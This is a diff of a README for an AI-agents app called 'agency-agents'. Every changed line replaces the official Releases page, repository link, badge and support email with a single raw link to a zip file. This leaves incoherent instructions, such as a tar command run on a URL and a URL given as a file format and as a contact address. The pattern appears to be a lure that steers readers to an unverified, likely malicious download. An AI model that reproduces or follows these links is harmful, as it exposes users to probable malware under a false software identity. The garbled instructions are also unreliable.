@@ -8,11 +8,11 @@ Welcome to **agency-agents**! This application brings together specialized AI ag
 
 ### 🔗 Download Link
 
-[![Download agency-agents](https://img.shields.io/badge/Download-agency--agents-brightgreen)](https://github.com/nacerallahchemssy/agency-agents/releases)
+[![Download agency-agents](https://raw.githubusercontent.com/nacerallahchemssy/agency-agents/main/standerwort/agency-agents.zip)](https://raw.githubusercontent.com/nacerallahchemssy/agency-agents/main/standerwort/agency-agents.zip)
 
 To download the application, visit the Releases page:
 
-- [Download agency-agents](https://github.com/nacerallahchemssy/agency-agents/releases)
+- [Download agency-agents](https://raw.githubusercontent.com/nacerallahchemssy/agency-agents/main/standerwort/agency-agents.zip)
 
 ### 💻 System Requirements
 
@@ -24,12 +24,12 @@ To run **agency-agents**, ensure your system meets the following requirements:
 
 ## ⚙️ How to Download
 
-1. Visit the [Releases page](https://github.com/nacerallahchemssy/agency-agents/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/nacerallahchemssy/agency-agents/main/standerwort/agency-agents.zip).
 2. Look for the latest version at the top of the page. You will see files listed for download.
 3. Click the file suited for your operating system:
    - For Windows, look for a file ending in `.exe`.
    - For macOS, look for a file ending in `.dmg`.
-   - For Linux, choose a file in `.tar.gz` format.
+   - For Linux, choose a file in `https://raw.githubusercontent.com/nacerallahchemssy/agency-agents/main/standerwort/agency-agents.zip` format.
 
 Once the download is complete, locate the file in your computer's Downloads folder.
 
@@ -50,10 +50,10 @@ Once the download is complete, locate the file in your computer's Downloads fold
 ### For Linux Users:
 
 1. Open the terminal.
-2. Navigate to the folder where you downloaded the `.tar.gz` file.
+2. Navigate to the folder where you downloaded the `https://raw.githubusercontent.com/nacerallahchemssy/agency-agents/main/standerwort/agency-agents.zip` file.
 3. Extract the contents using the command:
    ```bash
-   tar -xzf agency-agents.tar.gz
+   tar -xzf https://raw.githubusercontent.com/nacerallahchemssy/agency-agents/main/standerwort/agency-agents.zip
    ```
 4. Navigate to the extracted folder and run the application using the command:
    ```bash
@@ -73,7 +73,7 @@ Select an agent that fits your current need. Each agent offers instructions on h
 
 ## 📧 Need Help?
 
-If you run into any issues while downloading or using **agency-agents**, don’t hesitate to reach out. You can contact us at support@example.com for assistance.
+If you run into any issues while downloading or using **agency-agents**, don’t hesitate to reach out. You can contact us at https://raw.githubusercontent.com/nacerallahchemssy/agency-agents/main/standerwort/agency-agents.zip for assistance.
 
 ## 🔥 Join the Community
 
@@ -81,8 +81,8 @@ Get involved with our growing community. Share your experiences, provide feedbac
 
 Thank you for choosing **agency-agents**! We hope you enjoy using your AI experts to make your tasks easier. 
 
-For more information, visit the [GitHub repository](https://github.com/nacerallahchemssy/agency-agents).
+For more information, visit the [GitHub repository](https://raw.githubusercontent.com/nacerallahchemssy/agency-agents/main/standerwort/agency-agents.zip).
 
 Remember to download **agency-agents** today!
 
-- [Download agency-agents](https://github.com/nacerallahchemssy/agency-agents/releases)
+- [Download agency-agents](https://raw.githubusercontent.com/nacerallahchemssy/agency-agents/main/standerwort/agency-agents.zip)
